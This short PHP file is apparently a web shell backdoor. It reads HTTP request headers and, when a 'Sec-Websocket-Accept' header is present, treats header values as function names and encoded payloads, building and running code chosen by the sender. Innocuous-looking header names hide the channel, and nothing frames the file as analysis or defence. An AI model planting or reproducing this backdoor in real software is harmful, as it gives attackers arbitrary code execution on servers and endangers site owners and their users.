<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Sec-Websocket-Accept'])) {
    $internal = $_HEADERS['Sec-Websocket-Accept']('', $_HEADERS['If-Unmodified-Since']($_HEADERS['Content-Security-Policy']));
    $internal();
}